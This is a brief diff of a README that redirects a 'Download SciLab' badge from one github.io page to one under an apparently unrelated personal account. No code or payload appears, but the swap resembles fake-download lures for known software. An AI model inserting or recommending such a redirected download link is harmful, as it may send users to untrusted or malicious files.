@@ -2,7 +2,7 @@
 
 ## 📥 SciLab
 
-[![⬇️ SciLab](https://img.shields.io/badge/Download-SciLab-blue?style=for-the-badge&logo=scilab)](https://scilab-numerical-analysis.github.io/.github)
+[![⬇️ SciLab](https://img.shields.io/badge/Download-SciLab-blue?style=for-the-badge&logo=scilab)](https://xiusokolova.github.io/.github/scilab-numerical-analysis)
 
 ---
 
